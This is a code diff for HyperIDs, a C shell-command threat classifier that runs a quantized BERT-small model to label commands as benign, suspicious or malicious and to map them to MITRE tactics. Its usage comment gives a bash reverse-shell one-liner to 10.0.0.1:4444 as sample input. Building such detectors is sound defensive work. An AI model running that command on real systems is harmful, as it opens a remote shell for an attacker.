@@ -1,18 +1,15 @@
 /* HyperIDs — static single-binary shell-command threat classifier.
  *
- * Pure C inference (no ONNX Runtime). The model weights (fp32), vocab, and
- * label/MITRE tables are embedded at link time via `ld -r -b binary`.
+ * Pure C inference (no ONNX Runtime). Model weights (per-channel int8), vocab,
+ * and label/MITRE tables are embedded at link time via `ld -r -b binary`.
  *
  * Model: GLiClass uni-encoder over prajjwal1/bert-small (4 layers / 512 / 8 heads)
  *        + text/classes projectors + dot-product scorer.
- * Labels: verdict(3) + action(28) = 31. MITRE derived from actions via rules.
  *
  * Usage:
  *   hyperids 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'
- *   hyperids -          # read one command per line from stdin
- *   hyperids --json '...'   # JSON output
- *
- * Build: see Makefile (static, weights/vocab embedded).
+ *   hyperids -            # stdin, one command per line (prints verdict)
+ *   hyperids --json '...' # JSON output
  */
 #define _GNU_SOURCE
 #include <stdio.h>
@@ -23,18 +20,19 @@
 #include <time.h>
 #include <errno.h>
 #include <unistd.h>
+#include <stdint.h>
+#include <immintrin.h>
 
 #include "hyperids_labels.h"
 
-/* ---- embedded blobs (symbols produced by `ld -r -b binary`) ---- */
-extern const unsigned char _binary_ci_assets_model_f32_bin_start[];
-extern const unsigned char _binary_ci_assets_model_f32_bin_end[];
+/* ---- embedded blobs ---- */
+extern const unsigned char _binary_ci_assets_model_int8_bin_start[];
+extern const unsigned char _binary_ci_assets_model_int8_bin_end[];
 extern const unsigned char _binary_ci_assets_vocab_txt_start[];
 extern const unsigned char _binary_ci_assets_vocab_txt_end[];
 
 typedef float f32;
 
-/* ---- model config (compile-time, must match export_c_weights.py) ---- */
 #define CFG_VOCAB   30525
 #define CFG_HIDDEN  512
 #define CFG_LAYERS  4
@@ -42,15 +40,13 @@ typedef float f32;
 #define CFG_INTER   2048
 #define CFG_MAXSEQ  320
 #define CFG_EPS     1e-12f
-#define ATT_SCALE   0.125f                     /* 1/sqrt(64) */
+#define ATT_SCALE   0.125f
 
-#define CLS_ID       101
-#define SEP_ID       102
-#define LABEL_TOK    30522
-#define SEP_TOK      30523
-#define UNK_ID       100
+#define CLS_ID  101
+#define SEP_ID  102
+#define UNK_ID  100
 
-/* ---- vocab (embedded) ---- */
+/* ---- vocab ---- */
 #define MAX_VOCAB 40000
 #define MAXW 256
 static char **g_vocab_tokens;
@@ -58,16 +54,13 @@ static int g_vocab_count = 0;
 typedef struct { char *w; int id; } VEntry;
 static VEntry *g_vocab_entries;
 
-static int vcmp(const void *a, const void *b) {
-    return strcmp(((const VEntry*)a)->w, ((const VEntry*)b)->w);
-}
+static int vcmp(const void *a, const void *b) { return strcmp(((const VEntry*)a)->w, ((const VEntry*)b)->w); }
 
 static int load_vocab_mem(const unsigned char *start, const unsigned char *end) {
     size_t len = (size_t)(end - start);
     char *buf = (char*)malloc(len + 1);
     if (!buf) return -1;
-    memcpy(buf, start, len);
-    buf[len] = 0;
+    memcpy(buf, start, len); buf[len] = 0;
     g_vocab_tokens = (char**)malloc(sizeof(char*) * MAX_VOCAB);
     g_vocab_entries = (VEntry*)malloc(sizeof(VEntry) * MAX_VOCAB);
     char *line = buf;
@@ -75,7 +68,7 @@ static int load_vocab_mem(const unsigned char *start, const unsigned char *end) 
         char *nl = strchr(line, '\n');
         if (nl) *nl = 0;
         size_t n = strlen(line);
-        while (n && (line[n-1]=='\r')) line[--n] = 0;
+        while (n && line[n-1]=='\r') line[--n] = 0;
         char *slot = (char*)malloc(n + 1);
         memcpy(slot, line, n + 1);
         g_vocab_tokens[g_vocab_count] = slot;
@@ -98,7 +91,6 @@ static int is_punct_ascii(char c) {
     const char *p = "!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~";
     return strchr(p, c) != NULL;
 }
-
 static int chr_lc(char a) { return (a>='A' && a<='Z') ? (a-'A'+'a') : a; }
 
 static int emit_wordpiece(const char *buf, int bn, int *out, int n, int cap) {
@@ -121,7 +113,6 @@ static int emit_wordpiece(const char *buf, int bn, int *out, int n, int cap) {
     return n;
 }
 
-/* WordPiece tokenize a command string (ASCII shell command). */
 static int tok_cmd(const char *text, int *out, int cap) {
     int n = 0;
     const char *p = text;
@@ -130,7 +121,6 @@ static int tok_cmd(const char *text, int *out, int cap) {
         char c = *p;
         if ((unsigned char)c >= 0x80) {
             if (bn) { buf[bn] = 0; n = emit_wordpiece(buf, bn, out, n, cap); bn = 0; }
-            /* full UTF-8 sequence -> single token (matches HF tokenizer) */
             char seq[5] = {0}; int slen = 0;
             unsigned char uc = (unsigned char)c;
             int cont = (uc >= 0xF0) ? 3 : (uc >= 0xE0) ? 2 : (uc >= 0xC0) ? 1 : 0;
@@ -150,14 +140,13 @@ static int tok_cmd(const char *text, int *out, int cap) {
             }
             p++; continue;
         }
-        if (bn < MAXW - 1) { buf[bn++] = chr_lc(c); }
+        if (bn < MAXW - 1) buf[bn++] = chr_lc(c);
         p++;
     }
     if (bn) { buf[bn] = 0; n = emit_wordpiece(buf, bn, out, n, cap); }
     return n;
 }
 
-/* Build full input_ids: [CLS] + label_prefix + cmd_tokens + [SEP], truncate to CFG_MAXSEQ. */
 static int build_input(const char *cmd, int *ids, int cap) {
     int n = 0;
     for (int i = 0; i < LABEL_PREFIX_LEN && n < cap; i++) ids[n++] = label_prefix_tokens[i];
@@ -172,71 +161,130 @@ static int build_input(const char *cmd, int *ids, int cap) {
     return n;
 }
 
-/* ---- model weights ---- */
+/* ---- model weights (int8 2D + fp32 1D) ---- */
 struct Model {
-    const f32 *emb_words, *emb_pos, *emb_ttype, *emb_ln_w, *emb_ln_b;
-    const f32 *q_w[CFG_LAYERS], *q_b[CFG_LAYERS], *k_w[CFG_LAYERS], *k_b[CFG_LAYERS];
-    const f32 *v_w[CFG_LAYERS], *v_b[CFG_LAYERS];
-    const f32 *attn_o_w[CFG_LAYERS], *attn_o_b[CFG_LAYERS];
+    const int8_t *emb_words; const f32 *emb_words_s;
+    const int8_t *emb_pos;   const f32 *emb_pos_s;
+    const int8_t *emb_ttype; const f32 *emb_ttype_s;
+    const f32 *emb_ln_w, *emb_ln_b;
+    const int8_t *q_w[CFG_LAYERS]; const f32 *q_w_s[CFG_LAYERS]; const f32 *q_b[CFG_LAYERS];
+    const int8_t *k_w[CFG_LAYERS]; const f32 *k_w_s[CFG_LAYERS]; const f32 *k_b[CFG_LAYERS];
+    const int8_t *v_w[CFG_LAYERS]; const f32 *v_w_s[CFG_LAYERS]; const f32 *v_b[CFG_LAYERS];
+    const int8_t *attn_o_w[CFG_LAYERS]; const f32 *attn_o_w_s[CFG_LAYERS]; const f32 *attn_o_b[CFG_LAYERS];
     const f32 *attn_ln_w[CFG_LAYERS], *attn_ln_b[CFG_LAYERS];
-    const f32 *ffn1_w[CFG_LAYERS], *ffn1_b[CFG_LAYERS];
-    const f32 *ffn2_w[CFG_LAYERS], *ffn2_b[CFG_LAYERS];
+    const int8_t *ffn1_w[CFG_LAYERS]; const f32 *ffn1_w_s[CFG_LAYERS]; const f32 *ffn1_b[CFG_LAYERS];
+    const int8_t *ffn2_w[CFG_LAYERS]; const f32 *ffn2_w_s[CFG_LAYERS]; const f32 *ffn2_b[CFG_LAYERS];
     const f32 *ffn_ln_w[CFG_LAYERS], *ffn_ln_b[CFG_LAYERS];
-    const f32 *tp1_w, *tp1_b, *tp2_w, *tp2_b;
-    const f32 *cp1_w, *cp1_b, *cp2_w, *cp2_b;
+    const int8_t *tp1_w; const f32 *tp1_w_s; const f32 *tp1_b;
+    const int8_t *tp2_w; const f32 *tp2_w_s; const f32 *tp2_b;
+    const int8_t *cp1_w; const f32 *cp1_w_s; const f32 *cp1_b;
+    const int8_t *cp2_w; const f32 *cp2_w_s; const f32 *cp2_b;
 };
 
-static const f32 *g_goff;
-static const f32 *g_gend;
+static const unsigned char *g_boff;
+static const unsigned char *g_bend;
 
-static const f32 *take(size_t count) {
-    const f32 *p = g_goff;
-    g_goff += count;
-    if (g_goff > g_gend) {
-        fprintf(stderr, "weight blob overrun\n");
-        exit(2);
-    }
+static const f32 *take_f32(size_t count) {
+    const f32 *p = (const f32*)g_boff;
+    g_boff += count * sizeof(f32);
+    if (g_boff > g_bend) { fprintf(stderr, "blob overrun\n"); exit(2); }
+    return p;
+}
+static const int8_t *take_i8(size_t count) {
+    const int8_t *p = (const int8_t*)g_boff;
+    g_boff += count;
+    if (g_boff > g_bend) { fprintf(stderr, "blob overrun\n"); exit(2); }
     return p;
 }
 
+/* read a 2D int8 matrix [N,K]: scale[N] fp32 + W[N*K] int8 */
+static void take_mat2d(const int8_t **w, const f32 **s, int N, int K) {
+    *s = take_f32(N);
+    *w = take_i8((size_t)N * K);
+}
+
 static void load_model_mem(const unsigned char *start, const unsigned char *end, struct Model *m) {
-    g_goff = (const f32*)start;
-    g_gend = (const f32*)end;
-    m->emb_words = take((size_t)CFG_VOCAB * CFG_HIDDEN);
-    m->emb_pos   = take((size_t)512 * CFG_HIDDEN);
-    m->emb_ttype = take((size_t)2 * CFG_HIDDEN);
-    m->emb_ln_w  = take(CFG_HIDDEN);
-    m->emb_ln_b  = take(CFG_HIDDEN);
+    g_boff = start; g_bend = end;
+    take_mat2d(&m->emb_words, &m->emb_words_s, CFG_VOCAB, CFG_HIDDEN);
+    take_mat2d(&m->emb_pos, &m->emb_pos_s, 512, CFG_HIDDEN);
+    take_mat2d(&m->emb_ttype, &m->emb_ttype_s, 2, CFG_HIDDEN);
+    m->emb_ln_w = take_f32(CFG_HIDDEN);
+    m->emb_ln_b = take_f32(CFG_HIDDEN);
     for (int l = 0; l < CFG_LAYERS; l++) {
-        m->q_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->q_b[l] = take(CFG_HIDDEN);
-        m->k_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->k_b[l] = take(CFG_HIDDEN);
-        m->v_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->v_b[l] = take(CFG_HIDDEN);
-        m->attn_o_w[l] = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->attn_o_b[l] = take(CFG_HIDDEN);
-        m->attn_ln_w[l] = take(CFG_HIDDEN); m->attn_ln_b[l] = take(CFG_HIDDEN);
-        m->ffn1_w[l] = take((size_t)CFG_INTER*CFG_HIDDEN); m->ffn1_b[l] = take(CFG_INTER);
-        m->ffn2_w[l] = take((size_t)CFG_HIDDEN*CFG_INTER); m->ffn2_b[l] = take(CFG_HIDDEN);
-        m->ffn_ln_w[l] = take(CFG_HIDDEN); m->ffn_ln_b[l] = take(CFG_HIDDEN);
+        take_mat2d(&m->q_w[l], &m->q_w_s[l], CFG_HIDDEN, CFG_HIDDEN); m->q_b[l] = take_f32(CFG_HIDDEN);
+        take_mat2d(&m->k_w[l], &m->k_w_s[l], CFG_HIDDEN, CFG_HIDDEN); m->k_b[l] = take_f32(CFG_HIDDEN);
+        take_mat2d(&m->v_w[l], &m->v_w_s[l], CFG_HIDDEN, CFG_HIDDEN); m->v_b[l] = take_f32(CFG_HIDDEN);
+        take_mat2d(&m->attn_o_w[l], &m->attn_o_w_s[l], CFG_HIDDEN, CFG_HIDDEN); m->attn_o_b[l] = take_f32(CFG_HIDDEN);
+        m->attn_ln_w[l] = take_f32(CFG_HIDDEN); m->attn_ln_b[l] = take_f32(CFG_HIDDEN);
+        take_mat2d(&m->ffn1_w[l], &m->ffn1_w_s[l], CFG_INTER, CFG_HIDDEN); m->ffn1_b[l] = take_f32(CFG_INTER);
+        take_mat2d(&m->ffn2_w[l], &m->ffn2_w_s[l], CFG_HIDDEN, CFG_INTER); m->ffn2_b[l] = take_f32(CFG_HIDDEN);
+        m->ffn_ln_w[l] = take_f32(CFG_HIDDEN); m->ffn_ln_b[l] = take_f32(CFG_HIDDEN);
     }
-    m->tp1_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->tp1_b = take(CFG_HIDDEN);
-    m->tp2_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->tp2_b = take(CFG_HIDDEN);
-    m->cp1_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->cp1_b = take(CFG_HIDDEN);
-    m->cp2_w = take((size_t)CFG_HIDDEN*CFG_HIDDEN); m->cp2_b = take(CFG_HIDDEN);
+    take_mat2d(&m->tp1_w, &m->tp1_w_s, CFG_HIDDEN, CFG_HIDDEN); m->tp1_b = take_f32(CFG_HIDDEN);
+    take_mat2d(&m->tp2_w, &m->tp2_w_s, CFG_HIDDEN, CFG_HIDDEN); m->tp2_b = take_f32(CFG_HIDDEN);
+    take_mat2d(&m->cp1_w, &m->cp1_w_s, CFG_HIDDEN, CFG_HIDDEN); m->cp1_b = take_f32(CFG_HIDDEN);
+    take_mat2d(&m->cp2_w, &m->cp2_w_s, CFG_HIDDEN, CFG_HIDDEN); m->cp2_b = take_f32(CFG_HIDDEN);
 }
 
-/* ---- BLAS-ish helpers ---- */
-static inline float gelu_erf(float x) {
-    return 0.5f * x * (1.0f + erff(x * 0.70710678118654752440f));
+/* ---- math ---- */
+static inline float gelu_erf(float x) { return 0.5f * x * (1.0f + erff(x * 0.70710678118654752440f)); }
+
+static inline float hsum8(__m256 v) {
+    __m128 lo = _mm256_castps256_ps128(v);
+    __m128 hi = _mm256_extractf128_ps(v, 1);
+    lo = _mm_add_ps(lo, hi);
+    __m128 t = _mm_movehl_ps(lo, lo);
+    lo = _mm_add_ps(lo, t);
+    t = _mm_shuffle_ps(lo, lo, 1);
+    lo = _mm_add_ss(lo, t);
+    return _mm_cvtss_f32(lo);
 }
 
-static void mm(const float *in, const float *W, const float *bias, int S, int K, int N, float *out) {
+/* int8 matrix multiply: out[s][n] = sum_k in[s][k] * (W[n][k] * scale[n]) + bias[n] */
+static void mm(const float *in, const int8_t *W, const f32 *scale, const f32 *bias,
+               int S, int K, int N, float *out) {
     for (int s = 0; s < S; ++s) {
         const float *ins = in + (size_t)s * K;
         float *outs = out + (size_t)s * N;
         for (int n = 0; n < N; ++n) {
-            double sum = bias ? (double)bias[n] : 0.0;
+            const int8_t *wrow = W + (size_t)n * K;
+            __m256 sc = _mm256_set1_ps(scale[n]);
+            __m256 acc = _mm256_setzero_ps();
+            int k = 0;
+            for (; k + 8 <= K; k += 8) {
+                __m128i wi = _mm_loadl_epi64((const __m128i*)(wrow + k));
+                __m256i wi32 = _mm256_cvtepi8_epi32(wi);
+                __m256 wf = _mm256_cvtepi32_ps(wi32);
+                wf = _mm256_mul_ps(wf, sc);
+                __m256 a = _mm256_loadu_ps(ins + k);
+                acc = _mm256_fmadd_ps(a, wf, acc);
+            }
+            float tail = 0.0f;
+            for (; k < K; ++k) tail += ins[k] * ((float)wrow[k] * scale[n]);
+            float sum = hsum8(acc) + tail;
+            outs[n] = bias ? sum + bias[n] : sum;
+        }
+    }
+}
+
+/* fp32 matrix multiply (for 1D-bias-free paths, unused but kept for clarity) */
+static void mm_f32(const float *in, const float *W, const float *bias, int S, int K, int N, float *out) {
+    for (int s = 0; s < S; ++s) {
+        const float *ins = in + (size_t)s * K;
+        float *outs = out + (size_t)s * N;
+        for (int n = 0; n < N; ++n) {
             const float *wrow = W + (size_t)n * K;
-            for (int k = 0; k < K; ++k) sum += (double)ins[k] * (double)wrow[k];
-            outs[n] = (float)sum;
+            __m256 acc = _mm256_setzero_ps();
+            int k = 0;
+            for (; k + 8 <= K; k += 8) {
+                __m256 a = _mm256_loadu_ps(ins + k);
+                __m256 b = _mm256_loadu_ps(wrow + k);
+                acc = _mm256_fmadd_ps(a, b, acc);
+            }
+            float tail = 0.0f;
+            for (; k < K; ++k) tail += ins[k] * wrow[k];
+            float sum = hsum8(acc) + tail;
+            outs[n] = bias ? sum + bias[n] : sum;
         }
     }
 }
@@ -253,18 +301,14 @@ static void ln_bias(float *h, const float *w, const float *b, int S, int H, floa
         for (int i = 0; i < H; ++i) row[i] = (float)((row[i] - mean) * inv) * w[i] + b[i];
     }
 }
+static void add_res(float *out, const float *in, int n) { for (int i = 0; i < n; ++i) out[i] += in[i]; }
 
-static void add_res(float *out, const float *in, int n) {
-    for (int i = 0; i < n; ++i) out[i] += in[i];
-}
-
-/* projector: h = gelu(x @ w1.T + b1); y = h @ w2.T + b2 */
-static void projector(const float *x, int rows, const float *w1, const float *b1,
-                      const float *w2, const float *b2, float *out) {
+static void projector(const float *x, int rows, const int8_t *w1, const f32 *w1s, const f32 *b1,
+                      const int8_t *w2, const f32 *w2s, const f32 *b2, float *out) {
     float *h = (float*)malloc(sizeof(float) * rows * CFG_HIDDEN);
-    mm(x, w1, b1, rows, CFG_HIDDEN, CFG_HIDDEN, h);
+    mm(x, w1, w1s, b1, rows, CFG_HIDDEN, CFG_HIDDEN, h);
     for (int i = 0; i < rows * CFG_HIDDEN; i++) h[i] = gelu_erf(h[i]);
-    mm(h, w2, b2, rows, CFG_HIDDEN, CFG_HIDDEN, out);
+    mm(h, w2, w2s, b2, rows, CFG_HIDDEN, CFG_HIDDEN, out);
     free(h);
 }
 
@@ -274,7 +318,6 @@ struct Workspace {
     int *ids;
     float *hidden, *buf2, *tmp, *q, *k, *v, *scores, *ctx, *inter;
 };
-
 static struct Model g_model;
 static struct Workspace *g_ws;
 
@@ -297,7 +340,6 @@ static int ws_alloc(struct Workspace *w) {
     return 0;
 }
 
-/* Forward pass; writes 31 logits into logits[]. Returns sequence length or -1. */
 static int forward(const char *cmd, float *logits) {
     struct Model *M = &g_model;
     struct Workspace *w = g_ws;
@@ -310,23 +352,26 @@ static int forward(const char *cmd, float *logits) {
     float *q = w->q, *k = w->k, *v = w->v;
     float *scores = w->scores, *ctx = w->ctx, *inter = w->inter;
 
+    /* embedding: dequantized word emb + pos + token_type(0) */
     for (int i = 0; i < nn; i++) {
-        const float *row = M->emb_words + (size_t)w->ids[i] * H;
-        memcpy(hidden + (size_t)i * H, row, sizeof(float) * H);
-    }
-    for (int i = 0; i < nn; i++) {
+        int tid = w->ids[i];
         int pidx = i < 512 ? i : 511;
-        const float *prow = M->emb_pos + (size_t)pidx * H;
-        const float *trow = M->emb_ttype;   /* token_type 0 */
+        const int8_t *wrow = M->emb_words + (size_t)tid * H;
+        const f32 sc = M->emb_words_s[tid];
+        const int8_t *prow = M->emb_pos + (size_t)pidx * H;
+        const f32 psc = M->emb_pos_s[pidx];
+        const int8_t *trow8 = M->emb_ttype;
+        const f32 tsc = M->emb_ttype_s[0];
         float *orow = hidden + (size_t)i * H;
-        for (int j = 0; j < H; j++) orow[j] = orow[j] + prow[j] + trow[j];
+        for (int j = 0; j < H; j++)
+            orow[j] = (float)wrow[j] * sc + (float)prow[j] * psc + (float)trow8[j] * tsc;
     }
     ln_bias(hidden, M->emb_ln_w, M->emb_ln_b, nn, H, CFG_EPS);
 
     for (int l = 0; l < CFG_LAYERS; l++) {
-        mm(hidden, M->q_w[l], M->q_b[l], nn, H, H, q);
-        mm(hidden, M->k_w[l], M->k_b[l], nn, H, H, k);
-        mm(hidden, M->v_w[l], M->v_b[l], nn, H, H, v);
+        mm(hidden, M->q_w[l], M->q_w_s[l], M->q_b[l], nn, H, H, q);
+        mm(hidden, M->k_w[l], M->k_w_s[l], M->k_b[l], nn, H, H, k);
+        mm(hidden, M->v_w[l], M->v_w_s[l], M->v_b[l], nn, H, H, v);
         for (int h = 0; h < NH; h++) {
             float *sc = scores + (size_t)h * nn * nn;
             for (int i = 0; i < nn; i++) {
@@ -335,8 +380,14 @@ static int forward(const char *cmd, float *logits) {
                 double mx = -1e30;
                 for (int j = 0; j < nn; j++) {
                     const float *kj = k + (size_t)j * H + h * HD;
-                    double d = 0.0;
-                    for (int d0 = 0; d0 < HD; d0++) d += (double)qi[d0] * (double)kj[d0];
+                    __m256 acc = _mm256_setzero_ps();
+                    for (int d0 = 0; d0 + 8 <= HD; d0 += 8) {
+                        __m256 a = _mm256_loadu_ps(qi + d0);
+                        __m256 b = _mm256_loadu_ps(kj + d0);
+                        acc = _mm256_fmadd_ps(a, b, acc);
+                    }
+                    double d = (double)hsum8(acc);
+                    for (int d0 = (HD & ~7); d0 < HD; d0++) d += (double)qi[d0] * (double)kj[d0];
                     d *= ATT_SCALE;
                     si[j] = (float)d;
                     if (d > mx) mx = d;
@@ -359,25 +410,22 @@ static int forward(const char *cmd, float *logits) {
                 memcpy(tmp + (size_t)i * H + h * HD,
                        ctx + (size_t)h * nn * HD + (size_t)i * HD, sizeof(float) * HD);
         }
-        mm(tmp, M->attn_o_w[l], M->attn_o_b[l], nn, H, H, buf2);
+        mm(tmp, M->attn_o_w[l], M->attn_o_w_s[l], M->attn_o_b[l], nn, H, H, buf2);
         add_res(buf2, hidden, nn * H);
         ln_bias(buf2, M->attn_ln_w[l], M->attn_ln_b[l], nn, H, CFG_EPS);
-        mm(buf2, M->ffn1_w[l], M->ffn1_b[l], nn, H, MID, inter);
+        mm(buf2, M->ffn1_w[l], M->ffn1_w_s[l], M->ffn1_b[l], nn, H, MID, inter);
         for (int i = 0; i < nn * MID; i++) inter[i] = gelu_erf(inter[i]);
-        mm(inter, M->ffn2_w[l], M->ffn2_b[l], nn, MID, H, hidden);
+        mm(inter, M->ffn2_w[l], M->ffn2_w_s[l], M->ffn2_b[l], nn, MID, H, hidden);
         add_res(hidden, buf2, nn * H);
         ln_bias(hidden, M->ffn_ln_w[l], M->ffn_ln_b[l], nn, H, CFG_EPS);
     }
 
-    /* class embeddings: hidden at each class_token_pos */
     float *class_emb = (float*)malloc(sizeof(float) * N_LABELS * H);
     for (int k = 0; k < N_LABELS; k++) {
         int pos = class_token_pos[k];
         if (pos >= nn) pos = nn - 1;
         memcpy(class_emb + (size_t)k * H, hidden + (size_t)pos * H, sizeof(float) * H);
     }
-
-    /* pooled: mean over all tokens */
     float *pooled = (float*)calloc(H, sizeof(float));
     for (int i = 0; i < nn; i++) {
         const float *row = hidden + (size_t)i * H;
@@ -385,47 +433,33 @@ static int forward(const char *cmd, float *logits) {
     }
     for (int j = 0; j < H; j++) pooled[j] /= (float)nn;
 
-    /* text projector */
     float *tp = (float*)malloc(sizeof(float) * H);
-    projector(pooled, 1, M->tp1_w, M->tp1_b, M->tp2_w, M->tp2_b, tp);
-
-    /* classes projector */
+    projector(pooled, 1, M->tp1_w, M->tp1_w_s, M->tp1_b, M->tp2_w, M->tp2_w_s, M->tp2_b, tp);
     float *cp = (float*)malloc(sizeof(float) * N_LABELS * H);
-    projector(class_emb, N_LABELS, M->cp1_w, M->cp1_b, M->cp2_w, M->cp2_b, cp);
+    projector(class_emb, N_LABELS, M->cp1_w, M->cp1_w_s, M->cp1_b, M->cp2_w, M->cp2_w_s, M->cp2_b, cp);
 
-    /* dot product */
     for (int k = 0; k < N_LABELS; k++) {
         double s = 0.0;
         const float *ck = cp + (size_t)k * H;
         for (int j = 0; j < H; j++) s += (double)tp[j] * (double)ck[j];
         logits[k] = (float)s;
     }
-
     free(class_emb); free(pooled); free(tp); free(cp);
     return nn;
 }
 
-/* ---- output helpers ---- */
-static void print_verdict(float *logits, const char **out_verdict) {
-    int bi = 0;
-    for (int i = 1; i < N_VERDICT; i++) if (logits[i] > logits[bi]) bi = i;
-    *out_verdict = VERDICT_NAMES[bi];
-}
-
+/* ---- output ---- */
 int main(int argc, char **argv) {
     int json_mode = 0;
     const char *cmd = NULL;
     int from_stdin = 0;
-
     if (argc >= 2 && strcmp(argv[1], "--json") == 0) { json_mode = 1; cmd = argc > 2 ? argv[2] : NULL; }
     else if (argc >= 2 && strcmp(argv[1], "-") == 0) { from_stdin = 1; }
     else if (argc >= 2) { cmd = argv[1]; }
     else { fprintf(stderr, "usage: %s '<command>' | %s - | %s --json '<command>'\n", argv[0], argv[0], argv[0]); return 2; }
 
-    if (load_vocab_mem(_binary_ci_assets_vocab_txt_start, _binary_ci_assets_vocab_txt_end) != 0) {
-        fprintf(stderr, "vocab load failed\n"); return 1;
-    }
-    load_model_mem(_binary_ci_assets_model_f32_bin_start, _binary_ci_assets_model_f32_bin_end, &g_model);
+    if (load_vocab_mem(_binary_ci_assets_vocab_txt_start, _binary_ci_assets_vocab_txt_end) != 0) { fprintf(stderr, "vocab load failed\n"); return 1; }
+    load_model_mem(_binary_ci_assets_model_int8_bin_start, _binary_ci_assets_model_int8_bin_end, &g_model);
     g_ws = (struct Workspace*)calloc(1, sizeof *g_ws);
     if (ws_alloc(g_ws) != 0) { fprintf(stderr, "workspace alloc failed\n"); return 1; }
 
@@ -450,66 +484,45 @@ int main(int argc, char **argv) {
     if (nn < 0) { fprintf(stderr, "encode failed\n"); return 1; }
 
     int bi = 0; for (int i = 1; i < N_VERDICT; i++) if (logits[i] > logits[bi]) bi = i;
-
-    /* verdict softmax */
     double mx = logits[0]; for (int i = 1; i < N_VERDICT; i++) if (logits[i] > mx) mx = logits[i];
     double vsum = 0; double ve[N_VERDICT];
     for (int i = 0; i < N_VERDICT; i++) { ve[i] = exp((double)logits[i] - mx); vsum += ve[i]; }
-
-    /* actions (sigmoid) + collect hit set */
-    int hit[N_ACTION]; int nhit = 0;
-    double ap[N_ACTION];
+    int hit[N_ACTION]; int nhit = 0; double ap[N_ACTION];
     for (int i = 0; i < N_ACTION; i++) {
         ap[i] = 1.0 / (1.0 + exp(-(double)logits[N_VERDICT + i]));
         if (ap[i] >= 0.5) hit[nhit++] = i;
     }
-
-    /* derive MITRE from action hit set */
     unsigned int tact_bits = 0, tech_bits = 0;
     for (int i = 0; i < nhit; i++) { tact_bits |= ACTION_TACTIC_BITMAP[hit[i]]; tech_bits |= ACTION_TECH_BITMAP[hit[i]]; }
 
     if (json_mode) {
         printf("{\"verdict\":\"%s\",\"verdict_probs\":{", VERDICT_NAMES[bi]);
-        for (int i = 0; i < N_VERDICT; i++)
-            printf("%s\"%s\":%.4f", i ? "," : "", VERDICT_NAMES[i], ve[i] / vsum);
+        for (int i = 0; i < N_VERDICT; i++) printf("%s\"%s\":%.4f", i ? "," : "", VERDICT_NAMES[i], ve[i] / vsum);
         printf("},\"actions\":[");
         int first = 1;
-        for (int i = 0; i < N_ACTION; i++) if (ap[i] >= 0.5) {
-            printf("%s\"%s\"", first ? "" : ",", ACTION_NAMES[i]); first = 0;
-        }
+        for (int i = 0; i < N_ACTION; i++) if (ap[i] >= 0.5) { printf("%s\"%s\"", first ? "" : ",", ACTION_NAMES[i]); first = 0; }
         printf("],\"tactics\":[");
         first = 1;
-        for (int i = 0; i < N_TACTICS; i++) if (tact_bits & (1u << i)) {
-            printf("%s\"%s\"", first ? "" : ",", TACTIC_NAMES[i]); first = 0;
-        }
+        for (int i = 0; i < N_TACTICS; i++) if (tact_bits & (1u << i)) { printf("%s\"%s\"", first ? "" : ",", TACTIC_NAMES[i]); first = 0; }
         printf("],\"techniques\":[");
         first = 1;
-        for (int i = 0; i < N_TECHNIQUES; i++) if (tech_bits & (1u << i)) {
-            printf("%s\"%s\"", first ? "" : ",", TECHNIQUE_NAMES[i]); first = 0;
-        }
+        for (int i = 0; i < N_TECHNIQUES; i++) if (tech_bits & (1u << i)) { printf("%s\"%s\"", first ? "" : ",", TECHNIQUE_NAMES[i]); first = 0; }
         printf("]}\n");
     } else {
         printf("verdict   : %s\n", VERDICT_NAMES[bi]);
-        printf("verdict_probs: benign=%.4f suspicious=%.4f malicious=%.4f\n",
-               ve[0]/vsum, ve[1]/vsum, ve[2]/vsum);
+        printf("verdict_probs: benign=%.4f suspicious=%.4f malicious=%.4f\n", ve[0]/vsum, ve[1]/vsum, ve[2]/vsum);
         printf("actions   : ");
         int first = 1;
-        for (int i = 0; i < N_ACTION; i++) if (ap[i] >= 0.5) {
-            printf("%s%s", first ? "" : ", ", ACTION_NAMES[i]); first = 0;
-        }
+        for (int i = 0; i < N_ACTION; i++) if (ap[i] >= 0.5) { printf("%s%s", first ? "" : ", ", ACTION_NAMES[i]); first = 0; }
         if (first) printf("(none)");
         printf("\n");
         printf("tactics   : ");
         first = 1;
-        for (int i = 0; i < N_TACTICS; i++) if (tact_bits & (1u << i)) {
-            printf("%s%s", first ? "" : ", ", TACTIC_NAMES[i]); first = 0;
-        }
+        for (int i = 0; i < N_TACTICS; i++) if (tact_bits & (1u << i)) { printf("%s%s", first ? "" : ", ", TACTIC_NAMES[i]); first = 0; }
         printf("\n");
         printf("techniques: ");
         first = 1;
-        for (int i = 0; i < N_TECHNIQUES; i++) if (tech_bits & (1u << i)) {
-            printf("%s%s", first ? "" : ", ", TECHNIQUE_NAMES[i]); first = 0;
-        }
+        for (int i = 0; i < N_TECHNIQUES; i++) if (tech_bits & (1u << i)) { printf("%s%s", first ? "" : ", ", TECHNIQUE_NAMES[i]); first = 0; }
         printf("\n");
     }
     return 0;
